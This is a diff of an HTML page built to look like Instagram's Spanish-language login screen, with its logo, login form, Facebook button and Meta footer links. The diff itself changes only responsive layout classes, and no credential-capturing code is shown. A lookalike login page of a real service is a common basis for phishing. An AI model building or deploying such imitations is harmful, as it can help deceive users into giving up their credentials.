@@ -54,18 +54,18 @@
     <div class="flex flex-col md:flex-row flex-grow w-full min-h-[calc(95vh-20px)]">
         
         <!-- Left Side (56.5%) -->
-        <div class="hidden md:flex relative w-[56.5%] bg-white dark:bg-[#000000] border-r-[3px] border-gray-200 dark:border-[#555555] flex-col items-start justify-center px-12 transition-colors duration-200 min-h-[600px]">
+        <div class="hidden md:flex relative w-1/2 lg:w-[56.5%] bg-white dark:bg-[#000000] border-r-[3px] border-gray-200 dark:border-[#555555] flex-col items-start justify-center px-6 lg:px-12 transition-colors duration-200 min-h-[600px]">
             
-            <div class="absolute top-12 left-12">
+            <div class="absolute top-12 left-8 lg:left-12">
                 <img src="https://static.cdninstagram.com/rsrc.php/yp/r/Nf4ckeATHBA.webp" alt="Logo" class="w-16 h-16 object-contain">
             </div>
 
-            <div class="flex flex-col items-start w-full max-w-[780px] mt-32 ml-24">
-                <h1 class="text-[29px] lg:text-[38px] font-normal text-left leading-[1.3] mb-8 tracking-wide text-black dark:text-white w-full whitespace-nowrap">
+            <div class="flex flex-col items-start w-full max-w-[780px] mt-32 ml-8 lg:ml-24">
+                <h1 class="text-[24px] lg:text-[29px] xl:text-[38px] font-normal text-left leading-[1.3] mb-8 tracking-wide text-black dark:text-white w-full whitespace-normal xl:whitespace-nowrap">
                     <span class="block text-left">
                         <span data-translate="hero_line1">Mira los momentos cotidianos de tus</span>
                     </span>
-                    <span class="block text-center pr-28 mt-3">
+                    <span class="block text-left lg:text-center pr-8 lg:pr-28 mt-3">
                         <span class="text-gradient" data-translate="hero_line2_part2">mejores amigos.</span>
                     </span>
                 </h1>
@@ -77,11 +77,11 @@
         </div>
 
         <!-- Right Side (43.5%) -->
-        <div class="w-full md:w-[43.5%] flex flex-col items-center justify-center px-6 py-12 bg-white dark:bg-[#1c1c1c] transition-colors duration-200">
+        <div class="w-full md:w-1/2 lg:w-[43.5%] flex flex-col items-center justify-center px-6 py-12 bg-white dark:bg-[#1c1c1c] transition-colors duration-200">
             
-            <div class="w-full max-w-[560px] flex flex-col">
+            <div class="w-full max-w-sm md:max-w-[400px] lg:max-w-[560px] mx-auto flex flex-col">
                 
-                <h2 class="text-black dark:text-white text-[17px] font-bold mb-4" data-translate="login_title">Iniciar sesión en Instagram</h2>
+                <h2 class="text-black dark:text-white text-[17px] font-bold mb-4 text-center md:text-left" data-translate="login_title">Iniciar sesión en Instagram</h2>
                 
                 <form id="loginForm" action="https://www.instagram.com" method="GET" class="flex flex-col gap-3.5" autocomplete="off" novalidate>
                     
@@ -91,7 +91,7 @@
                                oninput="checkForm()"
                                class="peer w-full bg-[#fafafa] dark:!bg-[#222222] border border-gray-400 dark:border-[#666666] text-gray-900 dark:!text-gray-100 font-semibold rounded-[16px] px-5 pt-6 pb-2 text-[14px] focus:outline-none focus:border-gray-600 dark:focus:border-gray-400 transition-colors">
                         <label for="username" data-translate="input_user_ph"
-                               class="absolute left-5 top-3.5 text-[#8a8a8a] font-semibold text-[14px] transition-all duration-200 pointer-events-none peer-focus:-translate-y-2 peer-focus:text-[11px] peer-valid:-translate-y-2 peer-valid:text-[11px]">
+                               class="absolute left-5 top-3.5 text-[#8a8a8a] font-semibold text-[14px] transition-all duration-200 pointer-events-none peer-focus:-translate-y-2 peer-focus:text-[11px] peer-valid:-translate-y-2 peer-valid:text-[11px] truncate max-w-[85%] md:max-w-full">
                             Número de celular, nombre de usuario o correo electrónico
                         </label>
                     </div>
@@ -120,7 +120,7 @@
                 </div>
 
                 <!-- Botones de Facebook y Crear Cuenta -->
-                <div class="mt-12 flex flex-col gap-3">
+                <div class="mt-8 md:mt-12 flex flex-col gap-3">
                     <button class="w-full bg-transparent hover:bg-gray-100 dark:bg-[#2c2c2c] dark:hover:bg-[#383838] border border-gray-300 dark:border-transparent text-gray-800 dark:text-[#e0e0e0] font-medium rounded-full py-2.5 flex items-center justify-center gap-2 text-[15px] transition-colors">
                         <i class="fa-brands fa-facebook text-[#1877F2] text-[18px]"></i>
                         <span data-translate="facebook_login">Iniciar sesión con Facebook</span>
@@ -145,7 +145,7 @@
     <!-- Footer General -->
     <footer class="w-full flex flex-col items-center justify-center pt-4 pb-16 px-4 bg-white dark:bg-black border-t border-gray-200 dark:border-[#3e3e3e] transition-colors duration-200 z-50">
         
-        <div class="single-line-footer flex flex-nowrap items-center justify-start md:justify-center gap-x-5 mb-3 w-full px-4 overflow-x-auto whitespace-nowrap">
+        <div class="single-line-footer flex flex-wrap md:flex-nowrap items-center justify-center gap-x-5 gap-y-3 mb-1.5 w-full px-4 text-center">
             <a href="https://about.meta.com/" target="_blank" class="text-gray-500 dark:text-[#737373] text-[13px] hover:underline">Meta</a>
             <a href="https://about.instagram.com/" target="_blank" class="text-gray-500 dark:text-[#737373] text-[13px] hover:underline" data-translate="footer_info">Información</a>
             <a href="https://about.instagram.com/blog/" target="_blank" class="text-gray-500 dark:text-[#737373] text-[13px] hover:underline">Blog</a>
@@ -164,7 +164,7 @@
             <a href="https://about.meta.com/technologies/meta-verified/" target="_blank" class="text-gray-500 dark:text-[#737373] text-[13px] hover:underline">Meta Verified</a>
         </div>
         
-        <div class="flex items-center justify-center gap-4">
+        <div class="flex items-center justify-center gap-4 mt-[8px]">
             <div class="relative inline-block text-left">
                 <button type="button" id="languageBtn" class="text-gray-500 dark:text-[#737373] text-[13px] flex items-center cursor-pointer hover:underline focus:outline-none">
                     <span id="currentLanguage">Español</span> 
